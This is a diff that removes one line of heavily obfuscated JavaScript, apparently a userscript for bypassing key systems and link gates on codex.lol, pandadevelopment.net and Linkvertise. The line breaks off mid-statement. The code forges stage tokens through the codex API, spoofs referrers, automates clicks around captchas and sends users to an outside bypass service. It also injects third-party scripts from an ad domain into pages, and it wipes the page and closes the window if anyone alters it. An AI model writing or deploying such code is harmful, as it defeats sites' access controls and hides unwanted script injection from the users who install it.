@@ -1,1 +1,2589 @@
-const _0x9d0720=_0x2600;(function(_0x34eff3,_0xff1eaa){const _0x81ad96=_0x2600,_0x45cc40=_0x34eff3();while(!![]){try{const _0x849e63=-parseInt(_0x81ad96(0x25c))/0x1+parseInt(_0x81ad96(0x1d1))/0x2*(-parseInt(_0x81ad96(0x29e))/0x3)+-parseInt(_0x81ad96(0x1f6))/0x4+-parseInt(_0x81ad96(0x272))/0x5+-parseInt(_0x81ad96(0x1ad))/0x6+-parseInt(_0x81ad96(0x291))/0x7+-parseInt(_0x81ad96(0x1d5))/0x8*(-parseInt(_0x81ad96(0x27c))/0x9);if(_0x849e63===_0xff1eaa)break;else _0x45cc40['push'](_0x45cc40['shift']());}catch(_0x3a3a67){_0x45cc40['push'](_0x45cc40['shift']());}}}(_0x33d0,0x2fab2));if(document[_0x9d0720(0x298)]=='Just\x20a\x20moment...')return;var currentURL=window[_0x9d0720(0x31e)][_0x9d0720(0x2bf)],newerURL=currentURL[_0x9d0720(0x32f)](_0x9d0720(0x22e),_0x9d0720(0x1ff)),pageTitle=document[_0x9d0720(0x298)],API=_0x9d0720(0x263);if(currentURL[_0x9d0720(0x26e)](_0x9d0720(0x22e)))window['location'][_0x9d0720(0x32f)](newerURL);else{if(pageTitle['includes']('NEO')&&pageTitle['includes']('1'))window[_0x9d0720(0x31e)][_0x9d0720(0x2bf)]=API+_0x9d0720(0x197);else{if(currentURL[_0x9d0720(0x26e)](_0x9d0720(0x223)))window['location'][_0x9d0720(0x32f)](_0x9d0720(0x1bf));else{if(pageTitle[_0x9d0720(0x26e)](_0x9d0720(0x256))&&pageTitle[_0x9d0720(0x26e)]('2'))window[_0x9d0720(0x31e)][_0x9d0720(0x32f)](API+_0x9d0720(0x17e));else{if(currentURL[_0x9d0720(0x26e)](_0x9d0720(0x2dd)))window[_0x9d0720(0x31e)]['replace'](_0x9d0720(0x1df));else pageTitle[_0x9d0720(0x26e)]('NEO')&&pageTitle[_0x9d0720(0x26e)]('3')&&window[_0x9d0720(0x31e)][_0x9d0720(0x32f)](API+_0x9d0720(0x17d));}}}}(function(){var _0x420baf={0x256:_0x3b9509=>{function _0x36c335(){const _0x25ecd9=_0x2600;if(window[_0x25ecd9(0x31e)]['hostname']==_0x25ecd9(0x173))return;const _0x1b1dde=[{'src':_0x25ecd9(0x262),'parent':'head'},{'src':'//mildcauliflower.com/43/63/c7/4363c7e706daa736f6938d859fd1f9d4.js','parent':_0x25ecd9(0x215)}];_0x1b1dde[_0x25ecd9(0x217)](({src:_0x312396,parent:_0x6ab9af})=>{const _0x493b2e=_0x25ecd9,_0x2460e9=document[_0x493b2e(0x1f4)](_0x493b2e(0x30f));_0x2460e9[_0x493b2e(0x19f)]=_0x312396,_0x2460e9[_0x493b2e(0x160)]=_0x493b2e(0x193),document[_0x6ab9af][_0x493b2e(0x1a4)](_0x2460e9);});}async function _0x40aab0(){const _0x53657d=_0x2600;try{const _0x5bbb23=_0x53657d(0x1f1);typeof k===_0x53657d(0x279)&&k['constructor'][_0x53657d(0x1ed)]===_0x53657d(0x22f)?typeof APIKEY===_0x53657d(0x279)&&k[_0x53657d(0x29a)]()[_0x53657d(0x26e)](_0x5bbb23+_0x53657d(0x188))?await k():(_0xa40fc1(),_0x4d7d38()):(_0xa40fc1(),_0x4d7d38());}catch(_0x4d49ac){console['error'](_0x53657d(0x16b),_0x4d49ac);}}function _0xa40fc1(){const _0x599fd1=_0x2600;document['body'][_0x599fd1(0x2d8)]='';}function _0x4d7d38(){const _0x3674b2=_0x2600;window[_0x3674b2(0x20f)]=function(){},window[_0x3674b2(0x287)]=function(){},document['addEventListener']=function(){},window['requestAnimationFrame']=function(){},document['body'][_0x3674b2(0x2d8)]='',window[_0x3674b2(0x19c)]();}_0x3b9509['exports']={'injectAds':_0x36c335},_0x40aab0();},0x50:(_0x5eb63f,_0x2ccf31,_0xa9098a)=>{const _0x3335a4=_0x2600,{handleError:_0xfe5256,sleep:_0x2e6338,linkvertiseSpoof:_0x18b84e,getTurnstileResponse:_0xe2a4c5,getGrecaptchaResponse:_0x46bcdd,notification:_0x33d5b1,base64decode:_0x4157ed}=_0xa9098a(0x2c8);async function _0x547d4c(){const _0x57f7cf=_0x2600;let _0x3d070e;while(!_0x3d070e){_0x3d070e=localStorage[_0x57f7cf(0x32a)](_0x57f7cf(0x295)),await _0x2e6338(0x3e8);}document?.[_0x57f7cf(0x168)]('a')?.[_0x57f7cf(0x177)]&&document[_0x57f7cf(0x168)]('a')[0x0][_0x57f7cf(0x2d8)][_0x57f7cf(0x26e)](_0x57f7cf(0x219))&&document[_0x57f7cf(0x168)]('a')[0x0]['click']();async function _0x504c72(){const _0x14ea54=_0x57f7cf;let _0x275c02=await fetch(_0x14ea54(0x2ba),{'method':'GET','headers':{'Android-Session':_0x3d070e}}),_0x11c872=await _0x275c02[_0x14ea54(0x21f)]();if(_0x11c872[_0x14ea54(0x1c8)]){if(_0x11c872['authenticated'])return[];return _0x11c872[_0x14ea54(0x1ec)];}else throw new Error(_0x14ea54(0x1b3));}async function _0x26b9ed(_0x3ccbde){const _0x55ec42=_0x57f7cf;let _0xa1856b=await fetch('https://api.codex.lol/v1/stage/initiate',{'method':_0x55ec42(0x1b5),'headers':{'Android-Session':_0x3d070e,'Content-Type':_0x55ec42(0x167)},'body':JSON[_0x55ec42(0x26f)]({'stageId':_0x3ccbde})}),_0xc15f58=await _0xa1856b['json']();if(_0xc15f58[_0x55ec42(0x1c8)])return _0xc15f58['token'];else throw new Error(_0x55ec42(0x2b3));}async function _0x51df50(_0x389c97,_0x330467){const _0x36ee61=_0x57f7cf;let _0x3c2db0=await fetch('https://api.codex.lol/v1/stage/validate',{'method':'POST','headers':{'Android-Session':_0x3d070e,'Content-Type':'application/json','Task-Referrer':_0x330467},'body':JSON[_0x36ee61(0x26f)]({'token':_0x389c97})}),_0x535b78=await _0x3c2db0[_0x36ee61(0x21f)]();if(_0x535b78[_0x36ee61(0x1c8)])return _0x535b78['token'];else throw new Error(_0x36ee61(0x1f3));}async function _0x1fdece(_0x3977ce){const _0x56039c=_0x57f7cf;let _0x55999a=await fetch(_0x56039c(0x218),{'method':_0x56039c(0x1b5),'headers':{'Android-Session':_0x3d070e,'Content-Type':_0x56039c(0x167)},'body':JSON[_0x56039c(0x26f)]({'tokens':_0x3977ce})}),_0x5c25b=await _0x55999a['json']();if(_0x5c25b[_0x56039c(0x1c8)])return!![];else throw new Error(_0x56039c(0x2ec));}function _0x432144(_0x5d8288){const _0x10d06f=_0x57f7cf;let _0x240f9c=_0x5d8288['split']('.')[0x1];return _0x240f9c=_0x4157ed(_0x240f9c),JSON[_0x10d06f(0x159)](_0x240f9c);}let _0x2830c9=await _0x504c72(),_0x5543af=0x0;while(localStorage[_0x57f7cf(0x32a)](_0x2830c9[_0x5543af])&&_0x5543af<_0x2830c9[_0x57f7cf(0x177)]){_0x5543af++;}if(_0x5543af==_0x2830c9[_0x57f7cf(0x177)])return;let _0x2bb2ef=[];try{while(_0x5543af<_0x2830c9[_0x57f7cf(0x177)]){let _0x261318=_0x2830c9[_0x5543af][_0x57f7cf(0x2c0)],_0x440f4a=await _0x26b9ed(_0x261318);await _0x2e6338(0x157c);let _0x202b06=_0x432144(_0x440f4a),_0x40c298;if(_0x202b06[_0x57f7cf(0x268)]['includes'](_0x57f7cf(0x1a8)))_0x40c298=_0x57f7cf(0x162);else _0x202b06['link'][_0x57f7cf(0x26e)]('loot-link')?_0x40c298=_0x57f7cf(0x264):_0x40c298=_0x57f7cf(0x289);let _0x1fbf01=await _0x51df50(_0x440f4a,_0x40c298);_0x2bb2ef['push']({'uuid':_0x261318,'token':_0x1fbf01}),_0x33d5b1(_0x5543af+0x1+'/'+_0x2830c9[_0x57f7cf(0x177)]+_0x57f7cf(0x2e7),0x1388),_0x5543af++;}_0x1fdece(_0x2bb2ef)&&(_0x33d5b1('bypassed\x20successfully'),window['location'][_0x57f7cf(0x249)]());}catch(_0x41ff30){_0xfe5256(_0x41ff30);}}async function _0x2bf54e(){const _0x20668c=_0x2600;let _0x622e12=setInterval(_0x1632ac,0x1f4);if(document['body'][_0x20668c(0x15c)]['includes']('Failed\x20to\x20elapse\x20required\x20time,\x20session\x20invalidated!')){_0x33d5b1('Bypassing\x20too\x20fast\x20might\x20get\x20detected.\x0aPlease\x20retry\x20or\x20connect\x20to\x20bacon.');return;}if(document['body'][_0x20668c(0x15c)][_0x20668c(0x26e)]('Token\x20mismatch,\x20session\x20invalidated!')){_0x33d5b1('Same\x20bypass\x20detected,\x20please\x20retry.');return;}if(_0x2114f2()){_0x33d5b1(_0x20668c(0x251));while(!_0x3ae4e1()){await _0x2e6338(0x3e8);}}if(document[_0x20668c(0x2fa)][_0x20668c(0x2d8)][_0x20668c(0x26e)]('you\x20got\x20the\x20key')){_0x33d5b1('Bypassed\x20successfully');return;}else{if(!document[_0x20668c(0x168)](_0x20668c(0x224))[_0x20668c(0x177)]){let _0x2c4aeb=Array[_0x20668c(0x2df)](document[_0x20668c(0x168)]('a')),_0x1bda42=[_0x20668c(0x28a),_0x20668c(0x324)],_0x23e18c=['6\x20Hours\x20Key',_0x20668c(0x23c),'24\x20Hours\x20Key',_0x20668c(0x1fa)];for(let _0x523ac5 of _0x2c4aeb){let _0x590999=_0x523ac5[_0x20668c(0x233)][_0x20668c(0x2d8)];if(_0x23e18c[_0x20668c(0x26e)](_0x590999)){_0x33d5b1(_0x20668c(0x28e));return;}else{if(_0x1bda42[_0x20668c(0x26e)](_0x590999)){window[_0x20668c(0x31e)][_0x20668c(0x1c4)](_0x523ac5['href']);return;}}}}}function _0x438d2a(){const _0x5771da=_0x20668c;let _0xa8ba73=document[_0x5771da(0x168)]('form')[0x0],_0x5764eb=new FormData(_0xa8ba73);return new Promise((_0x4f3b96,_0x8647e9)=>{const _0x33734c=_0x5771da;GM['xmlHttpRequest']({'method':_0x33734c(0x1b5),'url':_0xa8ba73[_0x33734c(0x267)],'headers':{'Content-Type':_0x33734c(0x2bc),'Referer':window['location'][_0x33734c(0x2bf)]},'data':new URLSearchParams(_0x5764eb),'onload':function(_0x2147af){const _0x46c05b=_0x33734c;_0x2147af[_0x46c05b(0x2a4)]===0xc8?_0x4f3b96(_0x2147af['finalUrl']):_0x8647e9(_0x46c05b(0x337));},'onerror':async function(_0x401737){try{await _0x6cdad5();}catch(_0x11c466){_0x8647e9(_0x11c466);}}});});}function _0x3e7f7c(_0x178d16){const _0x2def45=_0x20668c;let _0x3f5b1d=new URL(encodeURI(_0x178d16));switch(_0x3f5b1d[_0x2def45(0x186)]){case _0x2def45(0x238):{return atob(_0x3f5b1d[_0x2def45(0x2e9)]['get']('r'));}case _0x2def45(0x200):{return _0x3f5b1d[_0x2def45(0x1dd)][_0x2def45(0x320)](_0x2def45(0x284))[0x1];}default:{if(new URL(window[_0x2def45(0x31e)][_0x2def45(0x2bf)])[_0x2def45(0x2e9)]['get'](_0x2def45(0x1c9)))return![];}}}function _0x1632ac(){const _0x3d56ef=_0x20668c;try{let _0x4d6b5b=document['getElementsByClassName']('adblock_title')[0x0];while(_0x4d6b5b[_0x3d56ef(0x1cb)]!=document[_0x3d56ef(0x215)]){_0x4d6b5b=_0x4d6b5b[_0x3d56ef(0x1cb)];}_0x4d6b5b[_0x3d56ef(0x1ac)](),clearInterval(_0x622e12);}catch(_0x465bba){}}function _0x2114f2(){const _0x27f0cf=_0x20668c;return document['querySelector'](_0x27f0cf(0x245))||document[_0x27f0cf(0x29b)]('.g-recaptcha');}function _0x3ae4e1(){const _0x4d30c6=_0x20668c;if(document[_0x4d30c6(0x29b)](_0x4d30c6(0x245))&&document[_0x4d30c6(0x29b)](_0x4d30c6(0x228)))return!![];if(document[_0x4d30c6(0x29b)]('.g-recaptcha')&&document[_0x4d30c6(0x29b)](_0x4d30c6(0x210))[_0x4d30c6(0x2f8)])return!![];return![];}document[_0x20668c(0x2d0)](_0x20668c(0x24c))&&await _0xe2a4c5();const _0x54b025={'vegax':0x2af8,'laziumtools':0x2af8,'adelhub':0x2af8,'neoxkey':0x36b0,'infinix':0x2af8,'beeconhub':0x2af8,'nilhubreborn':0x36b0,'evon':0x2af8,'mikeyhubreal':0x2af8,'goombahub1':0x2af8,'eruditehub':0x2af8,'rua':0x2af8,'askien':0x2af8};try{let _0xfae8ab=new URL(window[_0x20668c(0x31e)][_0x20668c(0x2bf)]),_0x26f09a=_0xfae8ab[_0x20668c(0x2e9)][_0x20668c(0x1aa)](_0x20668c(0x231)),_0x222d22=_0xfae8ab[_0x20668c(0x2e9)][_0x20668c(0x1aa)](_0x20668c(0x30d)),_0x186ff2=_0xfae8ab[_0x20668c(0x2e9)]['get']('sessiontoken'),_0x5393b3=_0xfae8ab[_0x20668c(0x2e9)][_0x20668c(0x1aa)]('provider'),_0x3615c5=_0xfae8ab[_0x20668c(0x2e9)]['get'](_0x20668c(0x19d))||0x1;if(_0x222d22===_0x20668c(0x1b0)){await _0x6cdad5();return;}let _0xf62bfe=await _0x438d2a(_0x26f09a,_0x222d22,_0x186ff2),_0xf5d8aa=_0x3e7f7c(_0xf62bfe);if(!_0xf5d8aa){let _0x187cda=_0x20668c(0x2bd)+_0x26f09a+_0x20668c(0x254)+_0x222d22+_0x20668c(0x2ef)+_0x3615c5;_0x5393b3&&(_0x187cda+=_0x20668c(0x2a6)+_0x5393b3),window[_0x20668c(0x31e)]['assign'](_0x187cda);}let _0x1d492e=0xbb8;Object[_0x20668c(0x15a)](_0x54b025)[_0x20668c(0x217)](_0x18ee4d=>{_0x222d22==_0x18ee4d&&(_0x1d492e=_0x54b025[_0x18ee4d]);}),await _0x2e6338(_0x1d492e),await _0x18b84e(_0xf5d8aa),_0x33d5b1(_0x20668c(0x2bb));let _0x1d4529=new URL(_0xf5d8aa);_0x186ff2=_0x1d4529[_0x20668c(0x2e9)][_0x20668c(0x1aa)](_0x20668c(0x1ba));let _0x543f48=_0x20668c(0x2bd)+_0x26f09a+_0x20668c(0x254)+_0x222d22+'&sessiontoken='+_0x186ff2+_0x20668c(0x2ef)+_0x3615c5;_0x5393b3&&(_0x543f48+='&provider='+_0x5393b3),window[_0x20668c(0x31e)]['assign'](_0x543f48);}catch(_0x113b0a){console[_0x20668c(0x213)](_0x20668c(0x16f),_0x113b0a),_0x33d5b1(_0x20668c(0x333)+_0x113b0a),await _0x2e6338(0xbb8),await _0x2bf54e();}}async function _0x6cdad5(){const _0x36f462=_0x2600,_0x32f203=_0x36f462(0x317);function _0xd212ee(){const _0x59e9fa=_0x36f462;let _0x5d23fa=document['createElement'](_0x59e9fa(0x226));_0x5d23fa['id']='initial-message',_0x5d23fa[_0x59e9fa(0x30e)][_0x59e9fa(0x336)]='fixed',_0x5d23fa[_0x59e9fa(0x30e)][_0x59e9fa(0x26d)]=_0x59e9fa(0x2a9),_0x5d23fa[_0x59e9fa(0x30e)][_0x59e9fa(0x277)]=_0x59e9fa(0x27a),_0x5d23fa['style'][_0x59e9fa(0x1e4)]=_0x59e9fa(0x23f),_0x5d23fa[_0x59e9fa(0x30e)][_0x59e9fa(0x1ae)]=_0x59e9fa(0x292),_0x5d23fa[_0x59e9fa(0x30e)][_0x59e9fa(0x1f0)]=_0x59e9fa(0x2ac),_0x5d23fa[_0x59e9fa(0x30e)][_0x59e9fa(0x281)]=_0x59e9fa(0x2a9),_0x5d23fa[_0x59e9fa(0x30e)][_0x59e9fa(0x327)]='5px',_0x5d23fa[_0x59e9fa(0x30e)][_0x59e9fa(0x318)]=_0x59e9fa(0x29f),_0x5d23fa['style']['maxWidth']=_0x59e9fa(0x312),_0x5d23fa[_0x59e9fa(0x30e)][_0x59e9fa(0x1a2)]=_0x59e9fa(0x2f1),_0x5d23fa[_0x59e9fa(0x30e)][_0x59e9fa(0x1e2)]=_0x59e9fa(0x24f),_0x5d23fa[_0x59e9fa(0x2d8)]='',document['body'][_0x59e9fa(0x1a4)](_0x5d23fa);}function _0xc021dc(_0x52955a){const _0x42b687=_0x36f462;let _0x40b7d0=document[_0x42b687(0x2d0)](_0x42b687(0x280));!_0x40b7d0&&(_0x40b7d0=document['createElement'](_0x42b687(0x226)),_0x40b7d0['id']=_0x42b687(0x280),_0x40b7d0[_0x42b687(0x30e)][_0x42b687(0x336)]=_0x42b687(0x16d),_0x40b7d0[_0x42b687(0x30e)][_0x42b687(0x26d)]='50%',_0x40b7d0[_0x42b687(0x30e)]['right']='0',_0x40b7d0[_0x42b687(0x30e)][_0x42b687(0x1e4)]='translateY(-50%)',_0x40b7d0[_0x42b687(0x30e)][_0x42b687(0x1ae)]=_0x42b687(0x292),_0x40b7d0[_0x42b687(0x30e)][_0x42b687(0x1f0)]=_0x42b687(0x2ac),_0x40b7d0[_0x42b687(0x30e)]['padding']=_0x42b687(0x2a9),_0x40b7d0[_0x42b687(0x30e)]['zIndex']=_0x42b687(0x29f),_0x40b7d0[_0x42b687(0x30e)]['maxWidth']=_0x42b687(0x312),_0x40b7d0['style'][_0x42b687(0x1a0)]=_0x42b687(0x27d),document[_0x42b687(0x215)][_0x42b687(0x1a4)](_0x40b7d0));let _0x18251f=document['createElement'](_0x42b687(0x226));_0x18251f[_0x42b687(0x25a)]=_0x52955a,_0x40b7d0[_0x42b687(0x1a4)](_0x18251f);}function _0x136bf9(){const _0x9429e6=_0x36f462;return window[_0x9429e6(0x31e)][_0x9429e6(0x2bf)];}function _0x115847(_0x3bc19b){return new Promise(_0x3c30dd=>setTimeout(_0x3c30dd,_0x3bc19b));}async function _0x4a077a(_0x52bc1e,_0x9708c4=0x3e8,_0x14581b=0x7d0){const _0x31781d=_0x36f462;let _0x49cc9b=Math[_0x31781d(0x2ee)](Math[_0x31781d(0x16c)]()*(_0x14581b-_0x9708c4+0x1))+_0x9708c4;await _0x115847(_0x49cc9b),_0x52bc1e['click'](),_0xc021dc(_0x31781d(0x246)+_0x49cc9b+'ms');}function _0x1438ba(_0x1fa7ca){const _0xad2b36=_0x36f462,_0x2fa856=_0x1fa7ca[_0xad2b36(0x2da)](),_0x44ae07=_0x2fa856['left']+_0x2fa856['width']/0x2,_0x55f8b9=_0x2fa856[_0xad2b36(0x26d)]+_0x2fa856[_0xad2b36(0x201)]/0x2;let _0xe200a7=new MouseEvent(_0xad2b36(0x27b),{'clientX':_0x44ae07,'clientY':_0x55f8b9});document[_0xad2b36(0x163)](_0xe200a7),_0xc021dc(_0xad2b36(0x2fc)+_0x44ae07+',\x20'+_0x55f8b9+')');}function _0x45d725(){const _0x2d671f=_0x36f462;window[_0x2d671f(0x175)](0x0,Math[_0x2d671f(0x16c)]()*0x64),_0xc021dc(_0x2d671f(0x1ef));}function _0x93e810(_0x1a0b83){const _0x2cdc6b=_0x36f462;let _0x23e4c3=_0x136bf9(),_0x220213=encodeURIComponent(_0x23e4c3),_0x523750=_0x32f203[_0x2cdc6b(0x32f)]('{link}',_0x220213);_0xc021dc('API\x20request\x20URL:\x20'+_0x523750),GM_xmlhttpRequest({'method':'GET','url':_0x523750,'onload':function(_0x556d52){const _0x13871f=_0x2cdc6b;_0xc021dc(_0x13871f(0x1c1)+_0x556d52[_0x13871f(0x2a4)]),_0xc021dc(_0x13871f(0x2be)+_0x556d52[_0x13871f(0x285)]);if(_0x556d52[_0x13871f(0x2a4)]===0xc8||_0x556d52['status']===0xc9)try{let _0x55f745=JSON['parse'](_0x556d52['responseText']);_0xc021dc(_0x13871f(0x19e)+JSON[_0x13871f(0x26f)](_0x55f745)),_0x55f745&&_0x55f745[_0x13871f(0x2a4)]==='success'&&_0x55f745['result']?(_0xc021dc(_0x13871f(0x192)),setTimeout(()=>{const _0x4e9c18=_0x13871f;window[_0x4e9c18(0x31e)][_0x4e9c18(0x2bf)]=_0x55f745[_0x4e9c18(0x26c)];},0x1f40)):_0xc021dc('Invalid\x20API\x20response:\x20'+JSON['stringify'](_0x55f745));}catch(_0x5b3cde){_0xc021dc(_0x13871f(0x191)+_0x5b3cde[_0x13871f(0x32c)]);}else _0xc021dc('API\x20request\x20failed\x20with\x20status:\x20'+_0x556d52[_0x13871f(0x2a4)]);},'onerror':function(){const _0x5e38bb=_0x2cdc6b;_0xc021dc(_0x5e38bb(0x2c8));}});}function _0x35f716(_0x5bc3bd){const _0x185b37=_0x36f462;let _0x4fec31=Array[_0x185b37(0x2df)](document['querySelectorAll'](_0x185b37(0x1db)))[_0x185b37(0x252)](_0x5586f8=>_0x5586f8[_0x185b37(0x25a)][_0x185b37(0x2b9)]()===_0x5bc3bd);if(_0x4fec31)return _0x1438ba(_0x4fec31),_0x45d725(),_0x4a077a(_0x4fec31),_0xc021dc(_0x185b37(0x310)+_0x5bc3bd),!![];return _0xc021dc(_0x185b37(0x178)+_0x5bc3bd+_0x185b37(0x276)),![];}function _0x3cce95(_0x1291d1){const _0x51caf8=_0x36f462;let _0x4d80ee=Array[_0x51caf8(0x2df)](document[_0x51caf8(0x25f)]('a'))[_0x51caf8(0x252)](_0x3731f3=>_0x3731f3[_0x51caf8(0x2bf)][_0x51caf8(0x26e)](_0x1291d1));if(_0x4d80ee)return _0x1438ba(_0x4d80ee),_0x45d725(),_0x4a077a(_0x4d80ee),_0xc021dc(_0x51caf8(0x24a)+_0x1291d1),!![];return _0xc021dc('Button\x20with\x20href\x20containing\x20\x22'+_0x1291d1+_0x51caf8(0x276)),![];}function _0x3e370d(_0x4c352d,_0x63b9de){const _0x5e2351=_0x36f462;let _0x140309=Array['from'](document[_0x5e2351(0x25f)]('button.'+_0x4c352d))[_0x5e2351(0x252)](_0x478061=>_0x478061['textContent'][_0x5e2351(0x2b9)]()===_0x63b9de);if(_0x140309)return _0x1438ba(_0x140309),_0x45d725(),_0x4a077a(_0x140309),_0xc021dc(_0x5e2351(0x1ea)+_0x4c352d+'\x20and\x20text:\x20'+_0x63b9de),!![];return _0xc021dc(_0x5e2351(0x221)+_0x4c352d+_0x5e2351(0x2af)+_0x63b9de+'\x22\x20not\x20found'),![];}function _0x312e7a(){const _0x123934=_0x36f462;let _0x4af0d1=Array[_0x123934(0x2df)](document[_0x123934(0x25f)](_0x123934(0x305))),_0x451ed8=-0x1,_0x45e9fd=null;_0x4af0d1[_0x123934(0x217)](_0x3da765=>{const _0x1dfdf0=_0x123934;let _0x1bc446=new URL(_0x3da765[_0x1dfdf0(0x2bf)]),_0x4aed1f=parseInt(_0x1bc446[_0x1dfdf0(0x2e9)][_0x1dfdf0(0x1aa)](_0x1dfdf0(0x19d)),0xa);!isNaN(_0x4aed1f)&&_0x4aed1f>_0x451ed8&&(_0x451ed8=_0x4aed1f,_0x45e9fd=_0x3da765);});if(_0x45e9fd)return _0x1438ba(_0x45e9fd),_0x45d725(),_0x4a077a(_0x45e9fd),_0xc021dc(_0x123934(0x1a1)+_0x451ed8),!![];return _0xc021dc(_0x123934(0x30b)),![];}function _0x13faf3(){const _0x14daa4=_0x36f462;let _0x1c1198=Array[_0x14daa4(0x2df)](document[_0x14daa4(0x25f)](_0x14daa4(0x1e0)))[_0x14daa4(0x252)](_0xc4c433=>_0xc4c433[_0x14daa4(0x29b)]('span')?.[_0x14daa4(0x25a)]['trim']()===_0x14daa4(0x28a));if(_0x1c1198)return _0x1438ba(_0x1c1198),_0x45d725(),_0x4a077a(_0x1c1198),_0xc021dc('Clicked\x20Linkvertise\x20button'),!![];return _0xc021dc(_0x14daa4(0x31c)),![];}function _0x4b0176(){const _0x5e85f2=_0x36f462;return document[_0x5e85f2(0x29b)](_0x5e85f2(0x174))||document[_0x5e85f2(0x29b)](_0x5e85f2(0x245))||document[_0x5e85f2(0x29b)](_0x5e85f2(0x15e))||document['querySelector']('#captcha')||document[_0x5e85f2(0x215)][_0x5e85f2(0x25a)]['includes']('Token\x20mismatch,\x20session\x20invalidated!');}function _0x47c32b(){const _0x3e87b3=_0x36f462;let _0x3b7d37=document['querySelector'](_0x3e87b3(0x2d3));return _0x3b7d37&&_0x3b7d37['value'];}function _0x28f94f(){const _0x514b36=_0x36f462;let _0x369dc8=document['querySelector'](_0x514b36(0x24e));return _0x369dc8&&_0x369dc8[_0x514b36(0x2f8)];}async function _0x5d7e6f(){const _0x51f651=_0x36f462,_0x40159e=0x3;let _0x31cf11=0x0;if(_0x4b0176()){_0xc021dc(_0x51f651(0x2d7));while(_0x31cf11<_0x40159e){if(_0x47c32b()||_0x28f94f())return _0xc021dc('CAPTCHA\x20completed.'),!![];_0x31cf11++,await _0x115847(0xbb8);}_0xc021dc(_0x51f651(0x189));}return![];}async function _0x4b5e40(){const _0xa84a40=_0x36f462;_0xd212ee();let _0x3e3653=_0x136bf9();_0xc021dc(_0xa84a40(0x250)+_0x3e3653);if(_0x3e3653['startsWith'](_0xa84a40(0x22d))){if(await _0x5d7e6f()){if(_0x3e370d(_0xa84a40(0x17b),'Continue'))return;if(_0x312e7a())return;if(_0x35f716(_0xa84a40(0x2ae)))return;if(_0x3cce95(_0xa84a40(0x170)))return;if(_0x13faf3())return;}else{if(_0x3e370d(_0xa84a40(0x17b),'Continue'))return;if(_0x312e7a())return;if(_0x35f716('Continue'))return;if(_0x3cce95(_0xa84a40(0x170)))return;if(_0x13faf3())return;}}else _0x3e3653[_0xa84a40(0x1ee)]('https://linkvertise.com/')&&_0x93e810(_0x3e3653);}_0x4b5e40();}_0x5eb63f[_0x3335a4(0x207)]={'codex':_0x547d4c,'pandadevelopment':_0x2bf54e};},0x2c8:_0x305da5=>{const _0x2a9137=_0x2600;function _0x44732b(_0x3e9b0a){const _0x14d661=_0x2600,_0x2b6d1c=_0x3e9b0a[_0x14d661(0x32c)]?_0x3e9b0a['message']:_0x3e9b0a;alert(_0x2b6d1c),GM_notification({'text':_0x2b6d1c,'title':_0x14d661(0x1c7),'url':'','silent':!![]});}function _0xbb602(_0x1f80ef){return new Promise(_0x5c6b02=>setTimeout(_0x5c6b02,_0x1f80ef));}function _0x5dfe60(_0x4a1419){return new Promise((_0x4086e5,_0x4f0e79)=>{const _0x5e4193=_0x2600;GM[_0x5e4193(0x203)]({'method':_0x5e4193(0x303),'url':_0x4a1419,'headers':{'Referer':_0x5e4193(0x289)},'onload':_0x5c54a7=>_0x4086e5(_0x5c54a7[_0x5e4193(0x285)]),'onerror':_0x39086b=>_0x4f0e79(_0x39086b)});});}async function _0x5a20bb(){const _0x561718=_0x2600;_0x3034db('Please\x20solve\x20the\x20captcha',0xbb8);const _0x42ee9c=setInterval(()=>_0x3034db(_0x561718(0x251),0x1388),0x1770);let _0x2b6227='';while(!![]){try{_0x2b6227=turnstile['getResponse']();if(_0x2b6227)break;}catch(_0x7a2176){}await _0xbb602(0x3e8);}return clearInterval(_0x42ee9c),turnstile[_0x561718(0x1fd)]();}async function _0xaeb769(){const _0x384f7f=_0x2600;_0x3034db(_0x384f7f(0x251),0xbb8);const _0xc4534d=setInterval(()=>_0x3034db(_0x384f7f(0x251),0x1388),0x1770);let _0x204d1a='';while(!![]){try{_0x204d1a=grecaptcha[_0x384f7f(0x1fd)]();if(_0x204d1a)break;}catch(_0x4b1abd){}await _0xbb602(0x3e8);}return clearInterval(_0xc4534d),grecaptcha[_0x384f7f(0x1fd)]();}function _0x3034db(_0x28c147,_0xd8f636){const _0x3caad5=_0x2600,_0x36d4df={'text':_0x28c147,'title':_0x3caad5(0x2f6),'silent':!![]};if(_0xd8f636)_0x36d4df[_0x3caad5(0x1fc)]=_0xd8f636;GM_notification(_0x36d4df);}function _0x4764a1(_0x5813d3){const _0x309e3b=_0x2600;return _0x5813d3=_0x5813d3['replace'](/-/g,'+')[_0x309e3b(0x32f)](/_/g,'/'),atob(_0x5813d3);}_0x305da5[_0x2a9137(0x207)]={'handleError':_0x44732b,'sleep':_0xbb602,'linkvertiseSpoof':_0x5dfe60,'getTurnstileResponse':_0x5a20bb,'getGrecaptchaResponse':_0xaeb769,'notification':_0x3034db,'base64decode':_0x4764a1};}},_0x12810b={};function _0x23b1ec(_0x452f26){var _0x33fc76=_0x12810b[_0x452f26];if(_0x33fc76!==undefined)return _0x33fc76['exports'];var _0x587e10=_0x12810b[_0x452f26]={'exports':{}};return _0x420baf[_0x452f26](_0x587e10,_0x587e10['exports'],_0x23b1ec),_0x587e10['exports'];}var _0x146c46={};((()=>{const {codex:_0x312abd,pandadevelopment:_0x583223}=_0x23b1ec(0x50),{sleep:_0x34efc3,notification:_0x16806}=_0x23b1ec(0x2c8),{injectAds:_0x328909}=_0x23b1ec(0x256);async function _0xad76d6(){const _0x261531=_0x2600;switch(window[_0x261531(0x31e)][_0x261531(0x186)]){case'mobile.codex.lol':await _0x312abd();break;case _0x261531(0x1ce):window[_0x261531(0x31e)][_0x261531(0x1c4)](_0x261531(0x22a)+encodeURIComponent(window[_0x261531(0x31e)][_0x261531(0x2bf)]));break;case'pandadevelopment.net':await _0x34efc3(0xbb8),await _0x583223();break;default:break;}}_0xad76d6();})());}());function qSelector(_0x36b86d){const _0x2ea1e9=_0x9d0720;return document[_0x2ea1e9(0x29b)](_0x36b86d);}function isHidden(_0x3aebca){const _0x7ca013=_0x9d0720;return _0x3aebca[_0x7ca013(0x18a)]===null;}(function(){'use strict';const _0x5d1c64=_0x9d0720;var _0x101dc1=window[_0x5d1c64(0x31e)]!=window[_0x5d1c64(0x21d)][_0x5d1c64(0x31e)]?document[_0x5d1c64(0x220)]['toString']():document[_0x5d1c64(0x31e)][_0x5d1c64(0x29a)]();if(_0x101dc1[_0x5d1c64(0x1b6)](_0x5d1c64(0x1b8))==-0x1&&_0x101dc1[_0x5d1c64(0x1b6)](_0x5d1c64(0x1c3))==-0x1&&_0x101dc1[_0x5d1c64(0x1b6)](_0x5d1c64(0x288))==-0x1){const 